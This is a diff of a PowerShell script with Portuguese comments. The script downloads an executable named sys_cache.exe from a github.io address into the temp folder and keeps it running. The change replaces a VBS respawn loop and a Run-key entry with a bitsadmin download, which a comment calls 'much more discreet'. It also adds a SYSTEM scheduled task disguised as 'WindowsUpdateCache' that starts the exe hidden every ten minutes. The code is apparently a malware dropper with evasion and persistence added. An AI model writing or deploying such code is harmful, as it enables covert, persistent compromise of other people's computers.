@@ -1,26 +1,14 @@
 $dir = "$env:TEMP\sys_cache"
 if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
 
-# Baixa o executável diretamente
-Invoke-WebRequest -Uri "https://syslog992.github.io/sys-cache-update/sys_cache.exe" -OutFile "$dir\sys_cache.exe"
+# Download via BITSADMIN (Muito mais discreto que Invoke-WebRequest)
+start-process "bitsadmin" -ArgumentList "/transfer mydownloadjob https://syslog992.github.io/sys-cache-update/sys_cache.exe $dir\sys_cache.exe" -Wait
 
-# Guardião VBS para garantir que o .exe esteja sempre rodando
-$vbs = @"
-Set WshShell = CreateObject("WScript.Shell")
-Do
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'sys_cache.exe'")
-    If colProcesses.Count = 0 Then
-        WshShell.Run "$dir\sys_cache.exe", 0, False
-    End If
-    WScript.Sleep 30000
-Loop
-"@
-$vbs | Out-File -FilePath "$dir\guardiao.vbs" -Encoding ASCII
+# Criação de Tarefa Agendada (Substitui o Registro e o VBS)
+# Isso faz o programa rodar a cada 10 minutos, invisível, sem precisar de guardiao.vbs
+$action = New-ScheduledTaskAction -Execute "$dir\sys_cache.exe"
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdateCache" -User "SYSTEM" -Force
 
-# Persistência no Registro
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "SysCacheUpdate" -Value "wscript.exe $dir\guardiao.vbs"
-
-# Inicia o Guardião
-Start-Process "wscript.exe" "$dir\guardiao.vbs"
+# Inicia o executável agora
+Start-Process "$dir\sys_cache.exe" -WindowStyle Hidden
